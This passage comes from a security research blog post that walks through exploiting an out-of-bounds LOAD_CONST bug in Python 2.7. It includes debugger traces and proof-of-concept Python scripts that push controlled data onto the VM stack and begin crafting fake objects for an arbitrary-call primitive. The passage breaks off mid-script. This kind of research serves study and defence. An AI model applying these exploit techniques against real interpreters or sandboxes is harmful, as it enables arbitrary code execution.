<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025eaac0 ebx=025eafc0 ecx=025ea91b edx=026bef98 esi=025eaac0 edi=025eafc0
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91b=53
</span></code></pre></td></tr></table></div></figure>


<p>All right, at least now you have a more precise idea about how that Python virtual machine works, and more importantly how you can directly debug it without symbols. Of course, you can download the debug symbols on Linux and use that information in gdb ; it should make your life easier (&hellip;.but I hate gdb man&hellip;).</p>

<p>Note that I would love very much to have a debugger at the Python bytecode level, it would be much easier than instrumenting the interpreter. If you know one ping me! If you build one ping me too :&ndash;).</p>

<h1>The bug</h1>

<p>Here is the bug, spot it and give it some love:</p>

<figure class='code'><figcaption><span>LOAD_CONST bug</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#ifndef Py_DEBUG</span>
</span><span class='line'><span class="cp">#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))</span>
</span><span class='line'><span class="cp">#else</span>
</span><span class='line'><span class="c1">//...</span>
</span><span class='line'><span class="cm">/* Macro, trading safety for speed &lt;-- LOL, :) */</span>
</span><span class='line'><span class="cp">#define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))-&gt;ob_item[i])</span>
</span><span class='line'>
</span><span class='line'><span class="k">case</span> <span class="n">LOAD_CONST</span>:
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>  <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>  <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>  <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This may be a bit obscure for you, but keep in mind we control the index <em>oparg</em> and the content of <em>consts</em>. That means we can just push <em>untrusted</em> data on the virtual stack of the VM: brilliant. Getting a crash out of this bug is fairly easy, try to run these lines (on a Python 2.7 distribution):</p>

<figure class='code'><figcaption><span>craaaaash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">opcode</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'>  <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\xef\xbe</span><span class="s">&#39;</span> <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="s">&#39;</span><span class="se">\xad\xde</span><span class="s">&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="p">(),</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">a</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>..and as expected you get a fault (<em>oparg</em> is <em>edi</em>):</p>

<figure class='code'><figcaption><span>craaaaaaash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>(2058.2108): Access violation - code c0000005 (!!! second chance !!!)
</span><span class='line'>[...]
</span><span class='line'>eax=01cb1030 ebx=00000000 ecx=00000063 edx=00000046 esi=1e222c0c edi=beefdead
</span><span class='line'>eip=1e0ec5f7 esp=0027e7f8 ebp=0273a9f0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
</span><span class='line'>python27!PyEval_EvalFrameEx+0x347:
</span><span class='line'>1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
</span></code></pre></td></tr></table></div></figure>


<p>By the way, some readers might have caught the same type of bug in <em>LOAD_FAST</em> with the <em>fastlocals</em> array ; those readers are definitely right :).</p>

<h1>Walking through the PoC</h1>

<p>OK, so if you look only at the faulting instruction you could say that the bug is minor and we won&rsquo;t be able to turn it into something &ldquo;useful&rdquo;. But the essential piece when you want to exploit a software is to actually completely understand how it works. Then you are more capable of turning bugs that seems useless into interesting primitives.</p>

<p>As we said several times, from Python code you can&rsquo;t really push any value you want onto the Python virtual stack, obviously. The machine is only dealing with Python objects. However, with this bug we can corrupt the virtual stack by pushing arbitrary data that we control. If you do that well, you can end up causing the Python VM to call whatever address you want. That&rsquo;s exactly what I did back when I wrote <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a>.</p>

<p>In Python we are really lucky because we can control a lot of things in memory and we have natively a way to &ldquo;leak&rdquo; (I shouldn&rsquo;t call that a leak though because it&rsquo;s a feature) the address of a Python object with the function <em>id</em>. So basically we can do stuff, we can do it reliably and we can manage to not break the interpreter, like bosses.</p>

<h2>Pushing attacker-controlled data on the virtual stack</h2>

<p>We control <em>oparg</em> and the content of the tuple <em>consts</em>. We can also find out the address of that tuple. So we can have a Python string object that stores an arbitrary value, let&rsquo;s say <em>0xdeadbeef</em> and it will be pushed on the virtual stack.</p>

<p>Let&rsquo;s do that in Python now:</p>

<figure class='code'><figcaption><span>Pushing controlled value on the virtual stack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">opcode</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'>  <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&#39;</span>
</span><span class='line'><span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="mi">20</span> <span class="c"># 20 is the offset of the array of byte we control in the string</span>
</span><span class='line'><span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
</span><span class='line'><span class="c"># python27!PyEval_EvalFrameEx+0x347:</span>
</span><span class='line'><span class="c"># 1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????</span>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span><span class='line'><span class="n">high</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
</span><span class='line'><span class="n">low</span> <span class="o">=</span>  <span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Consts tuple @</span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">address_consts</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Address of controled data @</span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">address_s</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Offset between const and our object: @</span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">offset</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Going to push [</span><span class="si">%#.8x</span><span class="s">] on the virtual stack&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">address_consts</span> <span class="o">+</span> <span class="p">(</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">high</span><span class="p">)</span> <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">low</span><span class="p">),</span>
</span><span class='line'>  <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">a</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>..annnnd..</p>

<figure class='code'><figcaption><span>debugger view</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>D:\&gt;python 1.py
</span><span class='line'>Consts tuple @0x01db1030
</span><span class='line'>Address of controled data @0x022a0654
</span><span class='line'>Offset between const and our object: @0x0013bd86
</span><span class='line'>Going to push [0x022a0654] on the virtual stack
</span><span class='line'>
</span><span class='line'>*JIT debugger pops*
</span><span class='line'>
</span><span class='line'>eax=01db1030 ebx=00000000 ecx=00000063 edx=00000046 esi=deadbeef edi=0013bd86
</span><span class='line'>eip=1e0ec5fb esp=0027fc68 ebp=01e63fc0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
</span><span class='line'>python27!PyEval_EvalFrameEx+0x34b:
</span><span class='line'>1e0ec5fb ff06            inc     dword ptr [esi]      ds:002b:deadbeef=????????
</span><span class='line'>0:000&gt; ub eip l1
</span><span class='line'>python27!PyEval_EvalFrameEx+0x347:
</span><span class='line'>1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch]
</span><span class='line'>0:000&gt; ? eax+edi*4+c
</span><span class='line'>Evaluate expression: 36308564 = 022a0654
</span><span class='line'>0:000&gt; dd 022a0654 l1
</span><span class='line'>022a0654  deadbeef &lt;- the data we control in our PyStringObject
</span><span class='line'>0:000&gt; dps 022a0654-0n20 l2
</span><span class='line'>022a0640  00000003
</span><span class='line'>022a0644  1e226798 python27!PyString_Type
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, we control a part of the virtual stack :).</p>

<h2>Game over, LOAD_FUNCTION</h2>

<p>Once you control the virtual stack, the only limit is your imagination and the ability you have to find an interesting spot in the virtual machine. My idea was to use the <em>CALL_FUNCTION</em> opcode to craft a <em>PyFunctionObject</em> somehow, push it onto the virtual stack and to use the magic opcode.</p>

<figure class='code'><figcaption><span>PyFunctionObject definition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_HEAD</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_globals</span><span class="p">;</span> <span class="cm">/* A dictionary (other mappings won&#39;t do) */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_defaults</span><span class="p">;</span>  <span class="cm">/* NULL or a tuple */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_closure</span><span class="p">;</span> <span class="cm">/* NULL or a tuple of cell objects */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_doc</span><span class="p">;</span>   <span class="cm">/* The __doc__ attribute, can be anything */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_name</span><span class="p">;</span>  <span class="cm">/* The __name__ attribute, a string object */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_dict</span><span class="p">;</span>  <span class="cm">/* The __dict__ attribute, a dict or NULL */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_weakreflist</span><span class="p">;</span> <span class="cm">/* List of weak references */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_module</span><span class="p">;</span>  <span class="cm">/* The __module__ attribute, can be anything */</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The thing is, as we saw earlier, the virtual machine usually ensures the type of the object it handles. If the type checking fails, the function bails out and we are not happy, at all. It means we would need an information-leak to obtain a pointer to the PyFunction_Type static variable.</p>

<p>Fortunately for us, the CALL_FUNCTION can still be abused without knowing that magic pointer to craft correctly our object. Let&rsquo;s go over the source code to illustrate my sayings:</p>

<figure class='code'><figcaption><span>CALL_FUNCTION</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">case</span> <span class="n">CALL_FUNCTION</span>:
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">**</span><span class="n">sp</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PCALL</span><span class="p">(</span><span class="n">PCALL_ALL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sp</span> <span class="o">=</span> <span class="n">stack_pointer</span><span class="p">;</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">call_function</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sp</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="nf">call_function</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">oparg</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">na</span> <span class="o">=</span> <span class="n">oparg</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">nk</span> <span class="o">=</span> <span class="p">(</span><span class="n">oparg</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">na</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">nk</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">**</span><span class="n">pfunc</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">pp_stack</span><span class="p">)</span> <span class="o">-</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span> <span class="o">=</span> <span class="o">*</span><span class="n">pfunc</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">nk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ..Nope..</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">PyMethod_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">PyMethod_GET_SELF</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="c1">// ..Still Nope...</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">PyFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span>
</span><span class='line'>      <span class="c1">// Nope!</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">do_call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">pp_stack</span><span class="p">,</span> <span class="n">na</span><span class="p">,</span> <span class="n">nk</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="n">do_call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">na</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nk</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Nope</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">PyObject_Call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">callargs</span><span class="p">,</span> <span class="n">kwdict</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="n">PyObject_Call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">kw</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">ternaryfunc</span> <span class="n">call</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">call</span> <span class="o">=</span> <span class="n">func</span><span class="o">-&gt;</span><span class="n">ob_type</span><span class="o">-&gt;</span><span class="n">tp_call</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">PyObject</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// Yay an interesting call :)</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">call</span><span class="p">)(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">kw</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>So basically the idea to use <em>CALL_FUNCTION</em> was a good one, but we will need to craft two different objects:</p>

<ol>
<li>The first one will be a <em>PyObject</em> with <em>ob_type</em> pointing to the second object</li>
<li>The second object will be a <em>_typeobject</em> with <em>tp_call</em> the address you want to call</li>
</ol>


<p>This is fairly trivial to do and will give us an absolute-call primitive without crashing the interpreter: s.w.e.e.t.</p>

<figure class='code'><figcaption><span>absolute call via CALL_FUNCTION</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">opcode</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">puint</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'>  <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">PyStringObject_to_char_array_offset</span> <span class="o">=</span> <span class="mi">20</span>
</span><span class='line'><span class="n">second_object</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_second_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">second_object</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_second_object_controled_data</span> <span class="o">=</span> <span class="n">addr_second_object</span> <span class="o">+</span> <span class="n">PyStringObject_to_char_array_offset</span>
</span><span class='line'>
</span><span class='line'><span class="n">first_object</span> <span class="o">=</span> <span class="s">&#39;AAAA&#39;</span> <span class="o">+</span> <span class="n">puint</span><span class="p">(</span><span class="n">addr_second_object_controled_data</span><span class="p">)</span>
</span><span class='line'><span class="n">addr_first_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">first_object</span><span class="p">)</span>
